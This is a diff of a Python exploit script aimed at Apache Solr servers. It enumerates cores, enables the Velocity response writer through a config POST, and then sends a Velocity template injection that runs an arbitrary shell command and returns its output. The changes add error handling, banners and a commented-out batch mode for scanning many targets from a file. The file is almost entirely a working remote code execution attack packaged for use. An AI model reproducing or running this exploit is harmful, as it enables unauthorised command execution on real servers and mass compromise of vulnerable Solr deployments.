@@ -1,22 +1,30 @@
+#coding=utf-8
 
-import requests,sys,json
+import requests
+import sys
+import json
 
 
 def get_code_name(url):
-    # http://10.10.20.166:8983
-    core_url = url + '/solr/admin/cores?_=1572502179076&indexInfo=false&wt=json'
-    r = requests.get(core_url)
-    if r.status_code == 200 and 'responseHeader' in r.content and 'status' in r.content:
-        json_str = json.loads(r.content)
-        for i in json_str['status']:
-            core_name_url = url + '/solr/' + i + '/config'
-            print core_name_url
-            update_queryresponsewriter(core_name_url)
+    if url[-1] == '/':
+        url = url[:-1].split('\n')[0]
     else:
-        print "No core name exit!"
-
-
-
+        url = url.split('\n')[0]
+        
+    core_url = url + '/solr/admin/cores?indexInfo=false&wt=json'
+    print '[+] Querying Core Name: '+core_url,'\n'
+    try:
+        r = requests.get(core_url)
+        if r.status_code == 200 and 'responseHeader' in r.content and 'status' in r.content:
+            json_str = json.loads(r.content)
+            for i in json_str['status']:
+                core_name_url = url + '/solr/' + i + '/config'
+                print core_name_url
+                update_queryresponsewriter(core_name_url)
+        else:
+            print "No core name exit!"
+    except:
+        pass
 def update_queryresponsewriter(core_name_url):
     headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
@@ -40,32 +48,39 @@ def update_queryresponsewriter(core_name_url):
     }'''
     proxies = {"http":"http://127.0.0.1:8080"}
     r = requests.post(core_name_url,headers=headers,data=payload)
-
     if r.status_code == 200 and 'responseHeader' in r.content:
-        print "maybe enable Successful!\n"
+        print "[+] maybe enable Successful!"
         exp_url = core_name_url[:-7]
-        print exp_url
+        cmd = 'whoami'
         cmd = sys.argv[2]
+
         send_exp(exp_url,cmd)
     else:
-        print "enable Fail!\n"
-
+        print "[+] Enable Fail!\n"
 def send_exp(exp_url,cmd):
     exp_url = exp_url + r"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27" + cmd + r"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
     
     r = requests.get(exp_url)
     if r.status_code == 400 or r.status_code == 500 and len(r.content) >0:
-        print exp_url,'\n'
+        print ">>> [+] Exp Send Successful! <<<"
+        print "____________________________________________________________"
+        print '\n',exp_url,'\n'
         print '>>>>>>>\n',r.content
     else:
-        print "exp No Send Successful!\n"
-
-
+        print "[+] EXP No Send Successful!\n"
 if __name__ == '__main__':
-
+    print("\n[+] python %s http://x.x.x.x:8983  command\n" % sys.argv[0])
     # url = "http://192.168.5.86:8983"
     url = sys.argv[1]
-    print("\n[+] python %s http://x.x.x.x:8983  command\n" % sys.argv[0])
     get_code_name(url)
+
+    # 批量
+    # f = open('url.txt','rb')
+    # for i in f.readlines():
+    #     url = i.split('\r\n')[0]
+    #     get_code_name(url)
+
+    
+    
 
 
